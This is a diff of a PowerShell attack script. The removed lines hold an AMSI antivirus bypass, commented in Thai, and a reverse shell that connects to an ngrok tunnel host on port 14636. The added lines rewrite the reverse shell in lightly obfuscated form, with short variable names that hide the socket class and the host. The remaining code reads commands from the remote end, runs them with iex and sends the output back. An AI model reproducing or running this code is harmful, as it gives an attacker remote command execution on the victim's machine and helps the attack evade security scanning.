@@ -1,18 +1,10 @@
-# AMSI Bypass แบบ heavy obfuscate
-$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-$field = $amsi.GetField('amsiInitFailed','NonPublic,Static')
-$field.SetValue($null,$true)
-
-# Reverse Shell (เปลี่ยน port ให้ตรง ngrok)
-$client = New-Object System.Net.Sockets.TCPClient('0.tcp.ap.ngrok.io', 14636)
-$stream = $client.GetStream()
-[byte[]]$bytes = 0..65535|%{0}
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
-    $sendback = (iex $data 2>&1 | Out-String )
-    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-    $stream.Write($sendbyte,0,$sendbyte.Length)
-    $stream.Flush()
+$o = 'System.Net.Sockets.TCPClient'; $p = '0.tcp.ap.ngrok.io'; $r = 14636
+$c = New-Object $o($p, $r); $s = $c.GetStream()
+[byte[]]$b = 0..65535|%{0}
+while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
+    $d = (New-Object Text.ASCIIEncoding).GetString($b,0, $i)
+    $sb = (iex $d 2>&1 | Out-String ) + 'PS ' + (pwd).Path + '> '
+    $sb2 = ([text.encoding]::ASCII).GetBytes($sb)
+    $s.Write($sb2,0,$sb2.Length); $s.Flush()
 }
-$client.Close()
+$c.Close()
